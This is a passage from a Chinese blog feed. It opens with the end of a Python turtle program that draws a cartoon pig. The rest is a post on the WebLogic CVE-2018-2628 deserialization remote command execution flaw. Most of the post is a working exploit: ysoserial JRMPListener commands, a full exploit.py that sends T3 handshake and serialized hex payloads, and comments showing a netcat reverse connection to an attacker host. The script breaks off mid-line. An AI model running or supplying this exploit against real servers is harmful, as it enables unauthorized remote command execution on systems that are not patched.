setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">60</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">95</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">161</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> <span class="token number">0.4</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> i <span class="token operator">&lt;</span> <span class="token number">30</span> <span class="token keyword">or</span> <span class="token number">60</span> <span class="token operator">&lt;=</span> i <span class="token operator">&lt;</span> <span class="token number">90</span><span class="token punctuation">:</span>            a <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">0.08</span>            lt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 向左转3度</span>            fd<span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment"># 向前走a的步长</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            a <span class="token operator">=</span> a <span class="token operator">-</span> <span class="token number">0.08</span>            lt<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>            fd<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ears</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""画耳朵"""</span>    color<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"pink"</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">eyes</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""画眼睛"""</span>    color<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">95</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    seth<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">)</span>    seth<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    forward<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cheek</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""画脸颊"""</span>    color<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>    end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mouth</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""画嘴巴"""</span>    color<span class="token punctuation">(</span><span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span>    penup<span class="token punctuation">(</span><span class="token punctuation">)</span>    goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>    pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>    setheading<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span>    circle<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">setting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""设置参数"""</span>    pensize<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment"># 隐藏海龟</span>    hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span>    colormode<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"pink"</span><span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">840</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>    speed<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""主函数"""</span>    setting<span class="token punctuation">(</span><span class="token punctuation">)</span>    nose<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>    head<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">)</span>    ears<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span>    eyes<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">)</span>    cheek<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    mouth<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span>    done<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/code/python/turtle-hua-tu/image-20201212183953319.png" class="" title="image-20201212183953319">]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> turtle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</title>
      <link href="//lou-dong/weblogic-wls-core-components-fan-xu-lie-hua-ming-ling-zhi-xing-lou-dong-cve-2018-2628/"/>
      <url>//lou-dong/weblogic-wls-core-components-fan-xu-lie-hua-ming-ling-zhi-xing-lou-dong-cve-2018-2628/</url>
      
        <content type="html"><![CDATA[<h3 id="Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li>Weblogic 10.3.6.0</li><li>Weblogic 12.1.3.0</li><li>Weblogic 12.2.1.2</li><li>Weblogic 12.2.1.3</li></ul><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p><p>受影响的WebLogic的WLS核心组件存在严重的安全漏洞，通过T3协议可以在前台无需账户登录的情况下进行远程任意代码执行，且CVE-2018-2628为CVE-2017-3248黑名单修复的绕过。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><ol><li><p>启动一个JRMP Server：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp .\ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 30000 CommonsCollections1 "touch /tmp/1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用exploit.py脚本，向目标Weblogic（<code>http://your-ip:7001</code>）发送数据包：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python exploit<span class="token punctuation">.</span>py localhost <span class="token number">7001</span> <span class="token punctuation">.</span>\ysoserial<span class="token operator">-</span>master<span class="token operator">-</span>30099844c6<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">.</span>jar <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.113</span> <span class="token number">30000</span> JRMPClient<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exploit.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)</span><span class="token comment">#</span><span class="token comment"># IMPORTANT: Is provided only for educational or information purposes.</span><span class="token comment">#</span><span class="token comment"># Credit: Thanks by Liao Xinxi of NSFOCUS Security Team</span><span class="token comment"># Reference: http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</span><span class="token comment">#</span><span class="token comment"># How to exploit:</span><span class="token comment"># 1. run below command on JRMPListener host</span><span class="token comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><span class="token comment">#    2) java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><span class="token comment">#       e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'nc -nv 10.0.0.5 4040'</span><span class="token comment"># 2. start a listener on attacker host</span><span class="token comment">#    e.g. nc -nlvp 4040</span><span class="token comment"># 3. run this script on attacker host</span><span class="token comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><span class="token comment">#    2) python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><span class="token comment">#       e.g.</span><span class="token comment">#           a) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient (Using java.rmi.registry.Registry)</span><span class="token comment">#           b) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient2 (Using java.rmi.activation.Activator)</span><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token keyword">import</span> binascii<span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span>path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># generates ysoserial payload</span>    command <span class="token operator">=</span> <span class="token string">'java -jar {} {} {}:{} &gt; payload.out'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path_ysoserial<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span>                                                           jrmp_listener_port<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"command: "</span> <span class="token operator">+</span> command<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    bin_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'payload.out'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>bin_file<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">t3_handshake</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> server_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span>    a <span class="token operator">=</span> <span class="token string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'handshake successful'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">build_t3_request_object</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    data1 <span class="token operator">=</span> <span class="token string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span>    data2 <span class="token operator">=</span> <span class="token string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        <span class="token string">'{:04x}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>dport<span class="token punctuation">)</span><span class="token punctuation">)</span>    data3 <span class="token operator">=</span> <span class="token string">'1a7727000d3234322e323134'</span>    data4 <span class="token operator">=</span> <span class="token string">'2e312e32353461863d1d0000000078'</span>    <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token punctuation">[</span>data1<span class="token punctuation">,</span> data2<span class="token punctuation">,</span> data3<span class="token punctuation">,</span> data4<span class="token punctuation">]</span><span class="token punctuation">:</span>        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'send request payload successful,recv length:%d'</span> <span class="token operator">%</span>          <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_payload_objdata</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span>    payload <span class="token operator">+=</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span>    payload <span class="token operator">=</span> <span class="token string">'%s%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'{:08x}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            time<span class="token 